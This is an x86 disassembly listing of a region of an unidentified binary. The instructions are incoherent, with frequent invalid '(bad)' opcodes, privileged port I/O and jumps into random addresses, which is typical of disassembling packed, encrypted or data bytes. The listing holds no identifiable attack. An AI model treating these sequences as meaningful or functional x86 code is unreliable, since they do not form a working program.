  42d1b9:	lods   eax,DWORD PTR ds:[esi]
  42d1ba:	jecxz  0x42d171
  42d1bc:	sti    
  42d1bd:	fs inc ebx
  42d1bf:	je     0x42d236
  42d1c1:	in     al,0x92
  42d1c3:	or     edx,ebx
  42d1c5:	adc    al,0x6d
  42d1c7:	cmp    eax,0x480c938d
  42d1cc:	mov    edi,0x18c965dc
  42d1d1:	cmp    al,0x4c
  42d1d3:	lods   al,BYTE PTR ds:[esi]
  42d1d4:	fnstcw WORD PTR [ebp+0x4e4c43c1]
  42d1da:	and    DWORD PTR [ecx],ebp
  42d1dc:	in     al,0x1
  42d1de:	loop   0x42d1e2
  42d1e0:	les    esp,FWORD PTR [edx]
  42d1e2:	fistp  QWORD PTR [edx+0x23]
  42d1e5:	hlt    
  42d1e6:	adc    ah,BYTE PTR [esi+ebx*4-0x5807f8d8]
  42d1ed:	pop    ebp
  42d1ee:	xor    DWORD PTR [ecx],ebx
  42d1f0:	ds push esi
  42d1f2:	and    BYTE PTR [eax],dh
  42d1f4:	fwait
  42d1f5:	mov    eax,ds:0x42d797a
  42d1fa:	cdq    
  42d1fb:	jne    0x42d26b
  42d1fd:	out    dx,eax
  42d1fe:	sub    BYTE PTR [eax],al
  42d200:	aas    
  42d201:	jno    0x42d1ac
  42d203:	clc    
  42d204:	mov    bh,0x5d
  42d206:	jp     0x42d27b
  42d208:	mov    edx,0x1f1eb89
  42d20d:	lods   eax,DWORD PTR ds:[esi]
  42d20e:	mov    esp,0x9eb817fc
  42d213:	inc    eax
  42d214:	sbb    eax,0xdc760f95
  42d219:	dec    BYTE PTR [ebp+0x54f28d0f]
  42d21f:	push   edx
  42d220:	jge    0x42d1a7
  42d222:	inc    edi
  42d223:	(bad)  
  42d224:	sub    al,0x7c
  42d226:	pop    edx
  42d227:	mov    dh,0xcd
  42d229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d22a:	lahf   
  42d22b:	sub    edi,DWORD PTR [ebp-0x2f]
  42d22e:	lods   eax,DWORD PTR ds:[esi]
  42d22f:	ss jno 0x42d1ea
  42d232:	jb     0x42d1ed
  42d234:	dec    esi
  42d235:	std    
  42d236:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d237:	xchg   BYTE PTR [esi+eax*8+0x316ae829],al
  42d23e:	xor    bl,bh
  42d240:	push   0xfffffff6
  42d242:	rcr    cl,cl
  42d244:	xchg   esi,eax
  42d245:	cmp    al,0xf1
  42d247:	push   edx
  42d248:	xchg   esp,eax
  42d249:	xchg   edx,eax
  42d24a:	cmc    
  42d24b:	pop    edi
  42d24c:	(bad)  
  42d24e:	xchg   ecx,eax
  42d24f:	adc    al,0x7c
  42d251:	dec    edi
  42d252:	call   0x6b904a5e
  42d257:	aad    0xcb
  42d259:	push   0x0
  42d25b:	sub    al,0x9f
  42d25d:	xor    ch,bh
  42d25f:	das    
  42d260:	aaa    
  42d261:	cmc    
  42d262:	add    ch,BYTE PTR [ebx]
  42d264:	stc    
  42d265:	dec    ebx
  42d266:	mov    ecx,0x80216dd0
  42d26b:	mov    ebx,DWORD PTR [ebx+0x0]
	...
  42d2d6:	lea    ecx,[eax]
  42d2d8:	pop    ebp
  42d2d9:	jbe    0x42d2b8
  42d2db:	ja     0x42d28c
  42d2dd:	sti    
  42d2de:	aaa    
  42d2df:	out    0x36,eax
  42d2e1:	ja     0x42d2be
  42d2e3:	or     al,0x4
  42d2e5:	cwde   
  42d2e6:	pop    edx
  42d2e7:	jecxz  0x42d2ea
  42d2e9:	add    bh,bh
  42d2eb:	add    BYTE PTR [eax],al
  42d2ed:	add    BYTE PTR [esi-0x7f],dl
  42d2f0:	(bad)  
  42d2f1:	sahf   
  42d2f2:	mov    esi,0x60bd5331
  42d2f7:	ret    
  42d2f8:	enter  0x1e8,0xc2
  42d2fc:	test   al,0xf5
  42d2fe:	pop    esi
  42d2ff:	mov    al,ds:0xfa8cc0fc
  42d304:	dec    ecx
  42d305:	mov    cl,0x33
  42d307:	add    edi,DWORD PTR [edx]
  42d309:	fcomp  QWORD PTR [ebp+0x7eccb6e3]
  42d30f:	or     DWORD PTR [edx+0x12960a14],ecx
  42d315:	ds sahf 
  42d317:	icebp  
  42d318:	jno    0x42d2ff
  42d31a:	and    al,0x7a
  42d31c:	jbe    0x42d2a1
  42d31e:	int3   
  42d31f:	inc    esp
  42d320:	dec    edi
  42d321:	mov    ch,0x93
  42d323:	mov    cl,0xe3
  42d325:	mov    dh,0x92
  42d327:	fs call 0xb711:0x8347c0f
  42d32f:	fisubr DWORD PTR [ebx+ebp*1]
  42d332:	repnz sti 
  42d334:	in     al,dx
  42d335:	fidiv  DWORD PTR [ebp+0x768700b0]
  42d33b:	imul   ebx,DWORD PTR ds:0xe875e200,0x3a
  42d342:	push   ebx
  42d343:	ds stos BYTE PTR es:[edi],al
  42d345:	outs   dx,DWORD PTR ds:[esi]
  42d346:	or     eax,0x6dd9d433
  42d34b:	ins    DWORD PTR es:[edi],dx
  42d34c:	jecxz  0x42d37a
  42d34e:	adc    ah,BYTE PTR [ebp+ecx*4+0x2301e40c]
  42d355:	cmp    DWORD PTR [ecx-0x14],ebp
  42d358:	inc    edi
  42d359:	lahf   
  42d35a:	add    BYTE PTR [ebp+ebp*4+0x2b3b03ed],ah
  42d361:	jmp    0x966:0x4dbbd0ed
  42d368:	sar    DWORD PTR [edi],0xe5
  42d36b:	mov    eax,0xacd784df
  42d370:	fisttp DWORD PTR [esi-0x426ff745]
  42d376:	push   es
  42d377:	ds (bad) 
  42d379:	xor    eax,DWORD PTR [ebp-0x4a]
  42d37c:	pop    ss
  42d37d:	mov    eax,0xaad5a703
  42d382:	xchg   edi,eax
  42d383:	pusha  
  42d384:	add    bh,BYTE PTR [ecx+esi*8+0x34]
  42d388:	dec    edi
  42d389:	pop    eax
  42d38a:	ficomp DWORD PTR [ebp+0x4e]
  42d38d:	xchg   esp,eax
  42d38e:	aam    0xc9
  42d390:	lds    esi,FWORD PTR [ebp+0x5f187e0b]
  42d396:	outs   dx,BYTE PTR ds:[esi]
  42d397:	or     cl,BYTE PTR [ebx]
  42d399:	and    DWORD PTR [eax-0x50],esi
  42d39c:	inc    esp
  42d39d:	int    0xb9
  42d39f:	sub    BYTE PTR [edx-0x176512a0],ch
  42d3a5:	nop
  42d3a6:	pop    es
  42d3a7:	jmp    0x42d3fd
  42d3a9:	arpl   WORD PTR [esi+eax*2+0x17],bp
  42d3ad:	mov    ecx,0x3c1fc553
  42d3b2:	out    dx,al
  42d3b3:	xchg   ebx,eax
  42d3b4:	xchg   ebp,eax
  42d3b5:	dec    esp
  42d3b6:	jmp    0x1e47:0x3b4d22f
  42d3bd:	scas   eax,DWORD PTR es:[edi]
  42d3be:	jge    0x42d376
  42d3c0:	sti    
  42d3c1:	ror    DWORD PTR [ebx+0x5d],0xf2
  42d3c5:	mov    bl,0x3
  42d3c7:	xor    BYTE PTR [edi],ch
  42d3c9:	call   0x9c6c:0x19073b52
  42d3d0:	sub    DWORD PTR [ecx-0x4e],ecx
  42d3d3:	pop    ebp
  42d3d4:	enter  0x289b,0x4f
  42d3d8:	(bad)  
  42d3d9:	ror    BYTE PTR [ebp+edx*8+0x5c71e7cb],1
  42d3e0:	test   eax,0x6d7632ed
  42d3e6:	mov    ds:0xb6bbed19,eax
  42d3eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d3ec:	pop    ebp
	...
  42d455:	add    cl,al
  42d457:	into   
  42d458:	arpl   WORD PTR [ecx-0x21044291],bx
  42d45e:	pop    ecx
  42d45f:	xchg   esp,eax
  42d460:	aaa    
  42d461:	pushf  
  42d462:	cmp    BYTE PTR [esi],0x4a
  42d465:	xor    bl,BYTE PTR [ecx-0x1c]
  42d468:	add    DWORD PTR [eax],eax
  42d46a:	inc    DWORD PTR [eax]
  42d46c:	add    BYTE PTR [eax],al
  42d46e:	xchg   DWORD PTR [esi-0x76],edx
  42d471:	or     ch,BYTE PTR [edx]
  42d473:	ror    DWORD PTR [esi-0x7a],1
  42d476:	cmp    BYTE PTR [eax+0x79],ch
  42d479:	fbld   TBYTE PTR [ebx-0x5951d379]
  42d47f:	aaa    
  42d480:	(bad)  [edi]
  42d482:	mov    ds:0x7b574717,al
  42d487:	and    bl,BYTE PTR [edi-0x2c]
  42d48a:	mov    BYTE PTR [esi+ebp*2-0x6efcaa20],ch
  42d491:	repnz cmp bl,BYTE PTR [edx-0x3ab26c19]
  42d498:	and    ah,bh
  42d49a:	ret    0x5c3
  42d49d:	sub    DWORD PTR [ebp+0x3],edi
  42d4a0:	mov    eax,DWORD PTR [ebx+esi*8]
  42d4a3:	inc    esi
  42d4a4:	jecxz  0x42d494
  42d4a6:	adc    eax,0xb0d02d4b
  42d4ab:	out    dx,al
  42d4ac:	inc    edi
  42d4ad:	adc    dl,BYTE PTR [edx-0x69]
  42d4b0:	call   0x8082d9f7
  42d4b5:	inc    edx
  42d4b6:	les    edx,FWORD PTR [eax+0x1b]
  42d4b9:	add    eax,0xa332513a
  42d4be:	jae    0x42d505
  42d4c0:	outs   dx,BYTE PTR ds:[esi]
  42d4c1:	sub    ebx,DWORD PTR [edx+ebp*1+0xaffa00e]
  42d4c8:	xor    BYTE PTR [ecx+0x506eaa25],0x33
  42d4cf:	and    DWORD PTR [ebx+0x7fa5093d],eax
  42d4d5:	xor    BYTE PTR [ebp-0x6a],al
  42d4d8:	iret   
  42d4d9:	sbb    al,0x4f
  42d4db:	jns    0x42d4a4
  42d4dd:	and    al,BYTE PTR [esp+edx*2]
  42d4e0:	fcmovbe st,st(4)
  42d4e2:	or     DWORD PTR [ebx],ebp
  42d4e4:	cmp    BYTE PTR [ebx+ebx*8-0x5a],0x39
  42d4e9:	and    DWORD PTR [edi+0x22fc70de],eax
  42d4ef:	jne    0x42d4f5
  42d4f1:	cmp    eax,0xe908226
  42d4f6:	inc    edi
  42d4f7:	fidivr WORD PTR [edx-0x1e8b8712]
  42d4fd:	loope  0x42d4ea
  42d4ff:	mov    ds:0x30bf180c,eax
  42d504:	ror    BYTE PTR [esi+eiz*8],cl
  42d507:	out    0x89,al
  42d509:	cmp    DWORD PTR [ecx],ebx
  42d50b:	int    0xcf
  42d50d:	es jge 0x42d4d4
  42d510:	sub    al,0x56
  42d512:	xor    al,0x60
  42d514:	adc    al,0x2b
  42d516:	sbb    DWORD PTR [edx+ebx*2],esi
  42d519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d51a:	loope  0x42d51a
  42d51c:	sbb    al,0x8f
  42d51e:	push   es
  42d51f:	sub    bl,bh
  42d521:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d522:	inc    ebx
  42d523:	mov    ds:0x756a6d86,eax
  42d528:	pop    edx
  42d529:	xlat   BYTE PTR ds:[ebx]
  42d52a:	ja     0x42d513
  42d52c:	out    0xde,eax
  42d52e:	inc    edi
  42d52f:	or     ah,BYTE PTR [ebp-0x65]
  42d532:	pushw  ss
  42d534:	mov    ecx,DWORD PTR ds:0x196b948c
  42d53a:	xchg   ebx,eax
  42d53b:	les    ecx,FWORD PTR [ebx+0x5c]
  42d53e:	inc    edx
  42d53f:	mov    BYTE PTR [ebx-0x358cf97b],bl
  42d545:	cmp    eax,0x8aba2986
  42d54a:	mov    ss,WORD PTR ds:0x4a4b53f9
  42d550:	test   BYTE PTR es:[esi],bh
  42d553:	xchg   esp,eax
  42d554:	or     al,0x82
  42d556:	mov    DWORD PTR [edi+0x43],eax
  42d559:	cdq    
  42d55a:	rcl    DWORD PTR [ecx-0x31ba1aa9],cl
  42d560:	jnp    0x42d4f3
  42d562:	in     eax,0x8f
  42d564:	pushf  
  42d565:	mov    BYTE PTR [edi+edi*8+0x4c],ch
  42d569:	fs and edi,ecx
  42d56c:	out    dx,eax
	...
  42d5d5:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d5db:	ja     0x42d5b6
  42d5dd:	call   FWORD PTR [ebp+0x3e]
  42d5e0:	mov    ds:0xeee2dd5,eax
  42d5e5:	or     eax,0x1e558
  42d5ea:	inc    DWORD PTR [eax]
  42d5ec:	add    BYTE PTR [eax],al
  42d5ee:	cmp    BYTE PTR [eax],ch
  42d5f0:	test   DWORD PTR [ebp-0x63],ebp
  42d5f3:	xor    ch,BYTE PTR [esi-0x435aa473]
  42d5f9:	jmp    0x42d5a5
  42d5fb:	imul   edi,DWORD PTR [edx-0x30],0x35
  42d5ff:	sbb    al,0x77
  42d601:	lods   al,BYTE PTR ds:[esi]
  42d602:	mov    eax,0x785f46b6
  42d607:	mov    esi,0x3a35db68
  42d60c:	lock dec esp
  42d60e:	xchg   esp,eax
  42d60f:	pop    edi
  42d610:	shl    cl,cl
  42d612:	jmp    0x2354d2d8
  42d617:	pop    ecx
  42d618:	icebp  
  42d619:	call   0x8535bff7
  42d61e:	popa   
  42d61f:	mov    cl,0x98
  42d621:	data16 stos BYTE PTR es:[edi],al
  42d623:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  42d625:	(bad)
  42d629:	lock gs (bad) 
  42d62c:	jbe    0x42d5d9
  42d62e:	cmp    ch,BYTE PTR [eax]
  42d630:	and    al,0x5d
  42d632:	iret   
  42d633:	xchg   ebp,eax
  42d634:	pop    esi
  42d635:	mov    bp,0x97a8
  42d639:	scas   eax,DWORD PTR es:[edi]
  42d63a:	sub    BYTE PTR [ebx+0x9],0x2
  42d63e:	cmp    BYTE PTR [esi],dh
  42d640:	inc    BYTE PTR [edi]
  42d642:	in     al,dx
  42d643:	(bad)  
  42d645:	(bad)  
  42d646:	scas   eax,DWORD PTR es:[edi]
  42d647:	adc    eax,0xe6ab630c
  42d64c:	aas    
  42d64d:	(bad)  
  42d64e:	stos   DWORD PTR es:[edi],eax
  42d64f:	dec    ebp
  42d650:	xlat   BYTE PTR ds:[ebx]
  42d651:	push   es
  42d652:	imul   esp,DWORD PTR [edx-0x4c69ddae],0x35
  42d659:	pusha  
  42d65a:	dec    edx
  42d65b:	fdivr  QWORD PTR [edi]
  42d65d:	adc    eax,DWORD PTR [eax+0x2d]
  42d660:	dec    edi
  42d661:	outs   dx,BYTE PTR ds:[esi]
  42d662:	fsubrp st(5),st
  42d664:	dec    ecx
  42d665:	sub    BYTE PTR [edi-0x169b82b1],0xdb
  42d66c:	in     al,dx
  42d66d:	cld    
  42d66e:	xchg   esi,eax
  42d66f:	mov    ds:0x8129b544,eax
  42d674:	dec    esi
  42d675:	addr16 cld 
  42d677:	in     eax,0xef
  42d679:	sub    DWORD PTR [edi],0xffffffde
  42d67c:	fdiv   DWORD PTR [edx+0x49e8c677]
  42d682:	inc    ebx
  42d683:	mov    dl,0x57
  42d685:	jecxz  0x42d642
  42d687:	push   edx
  42d688:	xchg   ebp,eax
  42d689:	or     DWORD PTR [eax],edx
  42d68b:	fistp  QWORD PTR [ecx]
  42d68d:	jp     0x42d61d
  42d68f:	fdiv   QWORD PTR [ebx+0x30]
  42d692:	xlat   BYTE PTR ds:[ebx]
  42d693:	or     esp,esp
  42d695:	in     eax,dx
  42d696:	or     al,0x8c
  42d698:	popf   
  42d699:	push   edi
  42d69a:	sahf   
  42d69b:	inc    esi
  42d69c:	cmc    
  42d69d:	rol    BYTE PTR [eax-0x6a],0xa6
  42d6a1:	std    
  42d6a2:	push   0xed13a50b
  42d6a7:	sbb    BYTE PTR [ecx-0x8],0x7e
  42d6ab:	inc    ebx
  42d6ac:	(bad)  
  42d6ad:	lods   eax,DWORD PTR ds:[esi]
  42d6ae:	fldcw  WORD PTR [esi-0x2f0b9b6]
  42d6b4:	daa    
  42d6b5:	adc    DWORD PTR [ebx+0xaeb51bf],edi
  42d6bb:	inc    ecx
  42d6bc:	inc    edx
  42d6bd:	and    BYTE PTR [esi],dl
  42d6bf:	xor    ah,BYTE PTR [edi-0x6142a6da]
  42d6c5:	inc    ecx
  42d6c6:	enter  0xb62,0xa1
  42d6ca:	cmp    edx,0xf97e9787
  42d6d0:	fwait
  42d6d1:	hlt    
  42d6d2:	sub    al,0xcc
  42d6d4:	pop    edx
  42d6d5:	mov    eax,ds:0xde4e1b53
  42d6da:	adc    bh,cl
  42d6dc:	sahf   
  42d6dd:	retf   
  42d6de:	icebp  
  42d6df:	mov    WORD PTR [edx-0x149b5665],?
  42d6e5:	mov    al,0x90
  42d6e7:	je     0x42d690
  42d6e9:	sbb    al,0xbf
  42d6eb:	(bad)  
  42d6ec:	repnz add BYTE PTR [eax],al
	...
  42d753:	add    BYTE PTR [eax],al
  42d755:	add    bl,dh
  42d757:	add    esp,DWORD PTR [eax]
  42d759:	(bad)  
  42d75a:	lock scas eax,DWORD PTR es:[edi]
  42d75c:	(bad)  
  42d75d:	jg     0x42d6e0
  42d75f:	in     al,0x2c
  42d761:	and    al,0x90
  42d763:	neg    BYTE PTR [ebp+0xd]
  42d766:	push   edi
  42d767:	out    0x1,al
  42d769:	add    bh,bh
  42d76b:	add    BYTE PTR [eax],al
  42d76d:	add    BYTE PTR [eax+0x311731ed],dl
  42d773:	loopne 0x42d7a9
  42d775:	aad    0xea
  42d777:	sub    eax,0xbac6c142
  42d77c:	or     ebx,esp
  42d77e:	inc    eax
  42d77f:	mov    ds:0x3d09adfa,eax
  42d784:	das    
  42d785:	sbb    DWORD PTR [edi+ebx*4+0x7e7e6ebf],edx
  42d78c:	loop   0x42d745
  42d78e:	push   esp
  42d78f:	pop    esi
  42d790:	add    al,0x49
  42d792:	xchg   ecx,eax
  42d793:	cmp    edx,eax
  42d795:	jbe    0x42d79b
  42d797:	dec    ebx
  42d798:	xchg   BYTE PTR [esi],cl
  42d79a:	jb     0x42d72b
  42d79c:	jecxz  0x42d774
  42d79e:	iret   
  42d79f:	adc    ch,0x7b
  42d7a2:	jb     0x42d730
  42d7a4:	sti    
  42d7a5:	mov    bl,0xe0
  42d7a7:	dec    ebp
  42d7a8:	shl    al,1
  42d7aa:	call   0x88f695b9
  42d7af:	dec    ebp
  42d7b0:	add    al,0xf
  42d7b2:	dec    eax
  42d7b4:	ret    0x3751
  42d7b7:	cmp    al,0x42
  42d7b9:	push   ecx
  42d7ba:	mov    cl,0x5
  42d7bc:	xchg   ebx,eax
  42d7bd:	call   0x3edd:0x4852b5c4
  42d7c4:	add    BYTE PTR [ecx-0x3d],bh
  42d7c7:	sbb    DWORD PTR [ebp+0x2b],esi
  42d7ca:	(bad)  
  42d7cb:	pop    esp
  42d7cc:	mov    al,0xd
  42d7ce:	rol    BYTE PTR [edi+esi*4],1
  42d7d1:	clc    
  42d7d2:	aad    0x25
  42d7d4:	fst    QWORD PTR [ebx]
  42d7d6:	push   ebx
  42d7d7:	stos   BYTE PTR es:[edi],al
  42d7d8:	jo     0x42d7fc
  42d7da:	loopne 0x42d770
  42d7dc:	sub    al,0x44
  42d7de:	push   ebx
  42d7df:	mov    bh,0xc6
  42d7e1:	pop    eax
  42d7e2:	mov    bl,0x26
  42d7e4:	aad    0xfd
  42d7e6:	inc    eax
  42d7e7:	pushf  
  42d7e8:	shl    DWORD PTR [esi+ebx*2+0x51],1
  42d7ec:	cmp    BYTE PTR [ebx-0x41200e4e],ah
  42d7f2:	in     al,dx
  42d7f3:	jge    0x42d793
  42d7f5:	test   al,bl
  42d7f7:	inc    esp
  42d7f8:	(bad)  
  42d7f9:	(bad)  [ebx-0x34]
  42d7fc:	inc    edx
  42d7fd:	or     DWORD PTR [esi-0x2ca4c864],ebp
  42d803:	repnz repz adc al,0xea
  42d807:	mov    ds:0xaa4f49ef,eax
  42d80c:	mov    ecx,ebp
  42d80e:	push   ebx
  42d80f:	add    al,0xf
  42d811:	popf   
  42d812:	sar    DWORD PTR [ecx-0x602e7278],0x27
  42d819:	mov    WORD PTR [ebx-0x48],?
  42d81c:	and    BYTE PTR [eax],0x36
  42d81f:	in     eax,dx
  42d820:	and    cl,BYTE PTR [eax]
  42d822:	fs loope 0x42d885
  42d825:	scas   eax,DWORD PTR es:[edi]
  42d826:	mov    eax,DWORD PTR [edi-0x6b]
  42d829:	xor    eax,0x1e0936d8
  42d82e:	jge    0x42d845
  42d830:	pop    ecx
  42d831:	out    0x14,al
  42d833:	aas    
  42d834:	push   eax
  42d835:	pop    esp
  42d836:	jno    0x42d81f
  42d838:	popa   
  42d839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d83a:	push   edi
  42d83b:	enter  0xcb39,0xaa
  42d83f:	les    edi,FWORD PTR ds:0x1ed6f6ba
  42d845:	xlat   BYTE PTR ds:[ebx]
  42d846:	push   ds
  42d847:	int3   
  42d848:	in     eax,0x4
  42d84a:	je     0x42d866
  42d84c:	push   ss
  42d84d:	dec    edx
  42d84e:	push   ss
  42d84f:	and    al,0xa5
  42d851:	sub    eax,0x35d8a027
  42d856:	jmp    0xb729:0x391e0c4a
  42d85d:	inc    esi
  42d85e:	inc    esi
  42d85f:	jl     0x42d8bc
  42d861:	pop    edi
  42d862:	xchg   BYTE PTR [ebx-0xa5eba2b],bl
  42d868:	test   DWORD PTR [ebx-0x31],0xea6d
	...
  42d8d3:	add    BYTE PTR [eax],al
  42d8d5:	add    BYTE PTR [esi-0x62a06765],dl
  42d8db:	pop    edi
  42d8dc:	xlat   BYTE PTR ds:[ebx]
  42d8dd:	fistp  DWORD PTR ds:0xe3c6961a
  42d8e3:	clc    
  42d8e4:	jmp    FWORD PTR [ebp+0x56]
  42d8e7:	out    0x1,eax
  42d8e9:	add    bh,bh
  42d8eb:	add    BYTE PTR [eax],al
  42d8ed:	add    BYTE PTR [edi-0x1a],bh
  42d8f0:	sub    al,0xff
  42d8f2:	dec    edi
  42d8f3:	xchg   esi,eax
  42d8f4:	call   0xd4b9d50c
  42d8f9:	dec    ebp
  42d8fa:	adc    al,0x7e
  42d8fc:	pop    ecx
  42d8fd:	cmp    DWORD PTR [ecx-0x28],ecx
  42d900:	jp     0x42d8fe
  42d902:	sub    BYTE PTR [esi],ah
  42d904:	xchg   ebp,eax
  42d905:	mov    ch,0x2f
  42d907:	pop    edx
  42d908:	inc    esp
  42d909:	push   0xffffffe9
  42d90b:	fidiv  WORD PTR [ebp-0x64]
  42d90e:	in     al,0xec
  42d910:	ins    DWORD PTR es:[edi],dx
  42d911:	jp     0x42d923
  42d913:	cs out dx,al
  42d915:	mov    ch,0x7c
  42d917:	imul   DWORD PTR fs:[eax+ebx*1+0x5a]
  42d91c:	sbb    ebx,DWORD PTR [ebp-0x9]
  42d91f:	outs   dx,DWORD PTR ds:[esi]
  42d920:	sbb    cl,BYTE PTR [esi-0x36]
  42d923:	jb     0x42d97a
  42d925:	pop    ebx
  42d926:	enter  0x58d9,0x92
  42d92a:	jg     0x42d8ae
  42d92c:	imul   esp,edx,0x54efc123
  42d932:	stos   BYTE PTR es:[edi],al
  42d933:	jp     0x42d957
  42d935:	adc    DWORD PTR [ecx-0x4f],ebp
  42d938:	dec    esp
  42d939:	sub    esi,DWORD PTR [eax-0x6f]
  42d93c:	cmp    DWORD PTR [esi],ebp
  42d93e:	mov    ebx,0xc5bf9d00
  42d943:	inc    ebp
  42d944:	in     eax,dx
  42d945:	popf   
  42d946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d947:	xchg   ecx,eax
  42d948:	xlat   BYTE PTR ds:[ebx]
  42d949:	xchg   esi,eax
  42d94a:	es call 0xec2e9c33
  42d950:	cs sbb al,0xf4
  42d953:	or     eax,0xab10bdc2
  42d958:	ja     0x42d982
  42d95a:	jg     0x42d987
  42d95c:	push   ss
  42d95d:	jne    0x42d967
  42d95f:	test   al,0x2e
  42d961:	sbb    al,0x8c
  42d963:	add    eax,0x4c03992a
  42d968:	and    DWORD PTR [edx],edx
  42d96a:	mov    ds:0x45212f6c,eax
  42d96f:	gs ret 0xe1a2
  42d973:	daa    
  42d974:	push   esp
  42d975:	icebp  
  42d976:	xor    esp,edi
  42d978:	jnp    0x42d9c8
  42d97a:	aas    
  42d97b:	push   0xffffffc8
  42d97d:	sti    
  42d97e:	rcr    BYTE PTR [ecx],cl
  42d980:	in     eax,0x49
  42d982:	add    eax,0x79d3d107
  42d987:	xchg   DWORD PTR [ecx+ebx*1-0x6b],esi
  42d98b:	in     eax,dx
  42d98c:	(bad)  
  42d98d:	enter  0x484e,0x9f
  42d991:	and    BYTE PTR [edi+ecx*1-0x27],bl
  42d995:	ins    DWORD PTR es:[edi],dx
  42d996:	xchg   DWORD PTR [ecx-0x2],edx
  42d999:	clc    
  42d99a:	xchg   BYTE PTR [eax-0x59],cl
  42d99d:	and    eax,ecx
  42d99f:	call   0x35c2e99a
  42d9a4:	div    ch
  42d9a6:	mov    ecx,0x17720dba
  42d9ab:	ret    0x61b8
  42d9ae:	inc    esp
  42d9af:	dec    edi
  42d9b0:	adc    al,BYTE PTR [edx+0x5e]
  42d9b3:	ds or  eax,0x2e7f164f
  42d9b9:	fbstp  TBYTE PTR [ecx]
  42d9bb:	jne    0x42d9ca
  42d9bd:	pop    edi
  42d9be:	sbb    BYTE PTR [ebx+eiz*2],0xfe
  42d9c2:	jno    0x42d9e0
  42d9c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d9c5:	sub    al,0x89
  42d9c7:	sub    bh,0x47
  42d9ca:	xchg   esp,eax
  42d9cb:	pushf  
  42d9cc:	shl    BYTE PTR [edx-0x3f],0xdf
  42d9d0:	mov    cl,0xac
  42d9d2:	add    al,0x29
  42d9d4:	scas   al,BYTE PTR es:[edi]
  42d9d5:	ficomp WORD PTR [eax-0x7395a05e]
  42d9db:	xor    DWORD PTR [ebx],edx
  42d9dd:	inc    ecx
  42d9de:	dec    ebx
  42d9df:	sti    
  42d9e0:	mov    esi,0x5705d37a
  42d9e5:	dec    edx
  42d9e6:	leave  
  42d9e7:	sub    al,0x50
  42d9e9:	in     al,dx
  42d9ea:	aad    0xee
  42d9ec:	adc    eax,0x0
	...
  42da55:	add    cl,bh
  42da57:	mov    cl,0x70
  42da59:	dec    eax
  42da5a:	js     0x42da25
  42da5c:	stc    
  42da5d:	mov    cl,0xbf
  42da5f:	dec    edi
  42da60:	int    0xe1
  42da62:	nop
  42da63:	gs ret 0x5566
  42da67:	call   0x141da6d
  42da6c:	add    BYTE PTR [eax],al
  42da6e:	sbb    edi,ebx
  42da70:	outs   dx,BYTE PTR ds:[esi]
  42da71:	jbe    0x42da11
  42da73:	stc    
  42da74:	mov    edi,0xc8120bfd
  42da79:	rcl    DWORD PTR [ecx+eiz*4],1
  42da7c:	out    0x1e,al
  42da7e:	mov    edx,0xc1d74650
  42da83:	fdiv   QWORD PTR [ecx+0x24aceb96]
  42da89:	jae    0x42da6a
  42da8b:	push   ds
  42da8c:	fiadd  DWORD PTR [ebx-0x58da251b]
  42da92:	inc    esi
  42da93:	shl    esi,0x44
  42da96:	jbe    0x42da50
  42da98:	fsub   st,st(6)
  42da9a:	lea    edi,[edx]
  42da9c:	sahf   
  42da9d:	jge    0x42da86
  42da9f:	out    0xf9,al
  42daa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42daa2:	xlat   BYTE PTR ds:[ebx]
  42daa3:	mov    cl,0x96
  42daa5:	cmc    
  42daa6:	cwde   
  42daa7:	aam    0xfd
  42daa9:	xchg   edx,eax
  42daaa:	shl    BYTE PTR [esi],0xc4
  42daad:	mov    eax,ds:0x2b252e66
  42dab2:	push   esi
  42dab3:	pop    esi
  42dab4:	push   es
  42dab5:	int    0xf0
  42dab7:	pop    ds
  42dab8:	pushf  
  42dab9:	fiadd  WORD PTR [edi+0x0]
  42dabc:	stos   DWORD PTR es:[edi],eax
  42dabd:	mov    BYTE PTR [ebp+esi*2-0x1eb2ec36],0x2e
  42dac5:	aaa    
  42dac6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dac7:	jmp    0x2a6b9fd4
  42dacc:	jnp    0x42db13
  42dace:	pop    es
  42dacf:	cwde   
  42dad0:	pop    eax
  42dad1:	adc    BYTE PTR [edx],bh
  42dad3:	push   esp
  42dad4:	pop    ebx
  42dad5:	push   eax
  42dad6:	jecxz  0x42db24
  42dad8:	jmp    0x42dac5
  42dada:	jl     0x42dac2
  42dadc:	call   0x565cb0ea
  42dae1:	(bad)  [ebp-0x672b1bf4]
  42dae7:	lds    eax,FWORD PTR [eax]
  42dae9:	dec    BYTE PTR [edi+0x64b67dc0]
  42daef:	mov    bl,0x10
  42daf1:	aad    0xa3
  42daf3:	inc    ebp
  42daf4:	dec    ebp
  42daf5:	pop    eax
  42daf6:	outs   dx,DWORD PTR ds:[esi]
  42daf7:	lods   eax,DWORD PTR ds:[esi]
  42daf8:	push   edi
  42daf9:	fidiv  DWORD PTR [edx+0x1f7422e4]
  42daff:	test   al,0x75
  42db01:	stos   BYTE PTR es:[edi],al
  42db02:	jg     0x42db6f
  42db04:	(bad)  
  42db05:	repz aas 
  42db07:	jmp    0x42dac2
  42db09:	mov    edx,0x1ccf5dd0
  42db0e:	enter  0xf1c1,0x4c
  42db12:	clc    
  42db13:	cs jo  0x42dacf
  42db16:	pop    ebx
  42db17:	sahf   
  42db18:	fnstcw WORD PTR [ecx]
  42db1a:	sbb    eax,0xececa38f
  42db1f:	pushf  
  42db20:	xchg   esi,eax
  42db21:	lods   al,BYTE PTR ds:[esi]
  42db22:	fst    DWORD PTR [ebp+eiz*1-0x5ac6bd81]
  42db29:	mov    bh,0x3c
  42db2b:	out    dx,eax
  42db2c:	jp     0x42dba3
  42db2e:	add    BYTE PTR [eax-0x25],ch
  42db31:	stos   DWORD PTR es:[edi],eax
  42db32:	sbb    DWORD PTR [edi+0x6c1b8ea1],0xeb68d181
  42db3c:	pop    es
  42db3d:	dec    esp
  42db3e:	aas    
  42db3f:	test   al,0xb5
